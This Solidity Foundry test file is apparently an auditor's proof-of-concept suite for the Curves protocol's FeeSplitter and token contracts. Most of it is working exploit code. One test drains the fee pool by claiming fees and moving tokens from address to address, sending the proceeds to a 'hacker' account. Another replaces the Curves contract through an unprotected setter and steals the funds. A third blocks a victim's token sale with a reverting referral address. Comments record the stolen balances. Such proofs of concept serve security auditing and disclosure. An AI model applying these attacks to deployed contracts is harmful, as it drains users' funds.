// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.7;

import {Test, console} from "forge-std/Test.sol";

import {CurvesERC20Factory} from "../../contracts/CurvesERC20Factory.sol";
import {FeeSplitter} from "../../contracts/FeeSplitter.sol";
import {Curves, CurvesErrors} from "../../contracts/Curves.sol";
import {CurvesERC20} from "../../contracts/CurvesERC20.sol";

import {FakeCurves} from "./FakeCurves.sol";
import {Revert} from "./Revert.sol";

contract FeeSplitterTest is Test {
    CurvesERC20Factory curveERC20Factory;
    FeeSplitter feeSplitter;
    Curves curves;

    address owner = makeAddr("owner");
    address feeReceiverOwner = makeAddr("feeReceiverOwner");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");
    address david = makeAddr("david");
    address elia = makeAddr("elia");
    address hacker = makeAddr("hacker");
    address victim = makeAddr("victim");

    uint256 constant FRIEND_TECH_INITIAL_PRICE = 62_500_000_000_000;

    function setUp() public {
        vm.deal(owner, 99 ether);

        vm.startPrank(owner);
        curveERC20Factory = new CurvesERC20Factory();
        feeSplitter = new FeeSplitter();
        curves = new Curves(address(curveERC20Factory), address(feeSplitter));
        feeSplitter.setCurves((curves));
        feeSplitter.setManager(address(curves), true);
        vm.stopPrank();
    }

    function test_consoleTokens() public {
        setFees();

        vm.startPrank(alice);
        curves.buyCurvesToken(alice, 1); // no fee because price is 0
        // assertEq(curves.curvesTokenBalance(alice, alice), 1);
        vm.stopPrank();

        vm.startPrank(bob);
        uint256 price = curves.getBuyPrice(alice, 2);
        (,,,, uint256 totalFee) = curves.getFees(price);
        uint256 amount = price + totalFee;
        vm.deal(bob, amount);
        curves.buyCurvesToken{value: amount}(alice, 2);
        // assertEq(curves.curvesTokenBalance(alice, bob), 2);
        price = curves.getBuyPrice(alice, 2);
        (,,,, totalFee) = curves.getFees(price);
        amount = price + totalFee;
        vm.deal(bob, amount);
        curves.buyCurvesToken{value: amount}(alice, 2);
        // assertEq(curves.curvesTokenBalance(alice, bob), 4);

        console.log("feeReceiver balance:", feeReceiverOwner.balance);
        console.log("alice balance -----:", alice.balance);
        console.log("feeSplitter balance:", address(feeSplitter).balance);

        uint256 aliceClaimableFees = feeSplitter.getClaimableFees(alice, alice);
        uint256 bobClaimableFees = feeSplitter.getClaimableFees(alice, bob);
        console.log("alice claimable fees:", aliceClaimableFees);
        console.log("bob - claimable fees:", bobClaimableFees);

        // curves.withdraw(alice, 4);

        feeSplitter.claimFees(alice);
        console.log(bob.balance);

        // (uint cumulativeFeePerToken )= feeSplitter.tokensData(alice);
        // console.log(cumulativeFeePerToken);

        // getClaimableFees(address token, address account)
        // getUserTokensAndClaimable(address user)
    }

    function test_stealFess() public {
        setFees(); // set protocol, subject, holders fees

        vm.startPrank(alice);
        curves.buyCurvesToken(alice, 1); // create alice's token
        assertEq(curves.curvesTokenBalance(alice, alice), 1);
        vm.stopPrank();

        uint256 AMOUNT = 4;
        createFees(AMOUNT); // buy some alice's tokens with some account to generate fees to drain

        console.log("before exploit-------------"); // console.log initial balance
        console.log("feeSplitter.balance:", address(feeSplitter).balance); // 8395937500000000000
        console.log("balance in ether(rounded): ", address(feeSplitter).balance / 1 ether); // 8
        address user = makeAddr(string(abi.encode(49)));
        uint256 userClaimableFees = feeSplitter.getClaimableFees(alice, user);

        //starting the exploit
        uint256 i = 49; // start by address 49(last account that bought token)
        while (address(feeSplitter).balance > userClaimableFees) {
            user = makeAddr(string(abi.encode(i))); // create account
            assertEq(user.balance, 0);
            assertEq(curves.curvesTokenBalance(alice, user), AMOUNT);
            userClaimableFees = feeSplitter.getClaimableFees(alice, user);

            vm.startPrank(user);
            feeSplitter.claimFees(alice); // claim fess for this account
            assertEq(user.balance, userClaimableFees);
            assert(user.balance > 0);
            assertEq(feeSplitter.getClaimableFees(alice, user), 0);
            address nextUser = makeAddr(string(abi.encode(i + 1))); //create next account to transfer token balance
            curves.transferCurvesToken(alice, nextUser, AMOUNT); // transfer token balance
            assertEq(curves.curvesTokenBalance(alice, nextUser), AMOUNT);

            address(hacker).call{value: userClaimableFees}(""); // send steal funds to hacker address
            vm.stopPrank();
            i++;
        }
        console.log("after exploit-------------");
        console.log("feeSplitter.balance:", address(feeSplitter).balance); // 42893543845696308
        console.log("balance in ether(rounded): ", address(feeSplitter).balance / 1 ether); // 0

        console.log("hacker balance: ", hacker.balance); // 8353043956154303692
        console.log("hacker balance in ether(rounded):", hacker.balance / 1 ether); // 8
            // hacker was able to steal all the funds in FeeSplitter
    }

    function test_isHoneyPot() public {
        setFees(); // set protocol, subject, holders fees
        vm.startPrank(alice);
        curves.buyCurvesToken(alice, 1); // create alice's token
        assertEq(curves.curvesTokenBalance(alice, alice), 1);
        vm.stopPrank();

        createFees(2);
        uint256 sum = 0;
        sum += feeSplitter.getClaimableFees(alice, alice);
        for (uint256 i = 0; i < 50; i++) {
            address user = makeAddr(string(abi.encode(i)));
            vm.startPrank(user);
            sum += feeSplitter.getClaimableFees(alice, user);
            vm.stopPrank();
        }
        console.log(sum);
        console.log(address(feeSplitter).balance);
        console.log(1 ether);
        // console.log(address(feeSplitter).balance - sum);
    }

    function test_accessControl() public {
        setFees(); // set protocol, subject, holders fees

        vm.startPrank(alice);
        curves.buyCurvesToken(alice, 1); // create alice's token
        assertEq(curves.curvesTokenBalance(alice, alice), 1);
        vm.stopPrank();
        uint256 AMOUNT = 4;
        createFees(AMOUNT); // buy some alice's tokens with some account to generate fees to drain

        address hackerAdd1 = makeAddr(string(abi.encode(49))); // hacker addr that bought some alice's tokens
        address hackerAdd2 = makeAddr("hackerAddr2");
        vm.startPrank(hackerAdd1);
        // we transfer tokens to our second address to have data.userFeeOffset=0
        // we need data.userFeeOffset to be 0 in order for our formula in FakeCurves to work
        curves.transferCurvesToken(alice, hackerAdd2, AMOUNT); // transfering alice's tokens
        vm.stopPrank();

        vm.startPrank(hackerAdd2);
        uint256 hackerAdd2ClaimableFees = feeSplitter.getClaimableFees(alice, hackerAdd2);
        console.log("claimable fees:", hackerAdd2ClaimableFees); // 245389473249490056 can legitimily claim

        FakeCurves fakeCurves = new FakeCurves(); // crate FakeCurves
        feeSplitter.setCurves(Curves(address(fakeCurves))); // setting the curves

        console.log("feesplitter balance before:", address(feeSplitter).balance); // 8395937500000000000
        feeSplitter.claimFees(alice); // claim fees
        console.log("feesplitter balance after :", address(feeSplitter).balance); // 52695409517338096
        console.log("hackerAdd2 balance -------:", address(hackerAdd2).balance); // 8343242090482661904
            //hacker was able to steal most of the funds in FeeSplitter contract
    }

    function test_flashLoanAttack() public {
        setFees(); // set protocol, subject, holders fees

        vm.startPrank(alice);
        curves.buyCurvesToken(alice, 1); // create alice's token
        assertEq(curves.curvesTokenBalance(alice, alice), 1);
        vm.stopPrank();
        uint256 AMOUNT = 4;
        createFees(AMOUNT); // buy some alice's tokens with some account to generate fees to drain

        console.log("feeSplitter balance", address(feeSplitter).balance);
        console.log("feeSplitter balance", address(feeSplitter).balance / 1 ether, "ether");

        vm.deal(hacker, 500 ether);
        // 8000 * 0.9 % = 72
        vm.startPrank(hacker);
        curves.buyCurvesToken(hacker, 1);

        uint256 price = curves.getBuyPrice(alice, 100);
        (,,,, uint256 totalFee) = curves.getFees(price);
        uint256 amountToPay = price + totalFee;
        console.log("price to pay", amountToPay);
        console.log("price to pay", amountToPay / 1 ether, "ether");
        console.log("hacker balance:", hacker.balance);
        console.log("hacker balance:", hacker.balance / 1 ether, "ether");
        curves.buyCurvesToken{value: amountToPay}(alice, 100);
        console.log("feeSplitter balance", address(feeSplitter).balance);
        console.log("feeSplitter balance", address(feeSplitter).balance / 1 ether, "ether");

        console.log("claimable fees:", feeSplitter.getClaimableFees(alice, hacker));
        console.log("claimable fees:", feeSplitter.getClaimableFees(alice, hacker) / 1 ether, "ether");
    }

    function test_dosReferral() public {
        vm.startPrank(alice); // alice malicius user
        curves.buyCurvesToken(alice, 1); // create alice's token
        assertEq(curves.curvesTokenBalance(alice, alice), 1);
        vm.stopPrank();

        vm.startPrank(victim);
        uint256 price = curves.getBuyPrice(alice, 5);
        (,,,, uint256 totalFee) = curves.getFees(price);
        uint256 amountToPay = price + totalFee;
        vm.deal(victim, amountToPay);
        curves.buyCurvesToken{value: amountToPay}(alice, 5);
        assertEq(curves.curvesTokenBalance(alice, victim), 5);
        vm.stopPrank();

        vm.startPrank(alice);
        Revert revertContract = new Revert();
        curves.setReferralFeeDestination(alice, address(revertContract));
        vm.stopPrank();

        vm.prank(victim);
        vm.expectRevert();
        curves.sellCurvesToken(alice, 5);

        assertEq(address(victim).balance, 0);
    }

    //helper function-----------------------
    function setFees() public {
        // 50/1000 => 0.05 => 5%
        //   50_000_000_000000000 = 0,05 ether
        // 1000_000_000_000000000 = 1,00 ether
        vm.startPrank(owner);
        curves.setMaxFeePercent(50_000_000_000000000 + 50_000_000_000000000 + 50_000_000_000000000);
        curves.setProtocolFeePercent(50_000_000_000000000, address(feeReceiverOwner)); //0.05 => 5%
        curves.setExternalFeePercent(50_000_000_000000000, 0, 50_000_000_000000000);
        vm.stopPrank();
    }

    function createFees(uint256 AMOUNT) public {
        for (uint256 i = 0; i < 50; i++) {
            address user = makeAddr(string(abi.encode(i)));
            vm.startPrank(user);
            uint256 price = curves.getBuyPrice(alice, AMOUNT);
            (,,,, uint256 totalFee) = curves.getFees(price);
            uint256 amountToPay = price + totalFee;
            vm.deal(user, amountToPay);
            curves.buyCurvesToken{value: amountToPay}(alice, AMOUNT);
            assertEq(curves.curvesTokenBalance(alice, user), AMOUNT);
            vm.stopPrank();
        }
    }
}
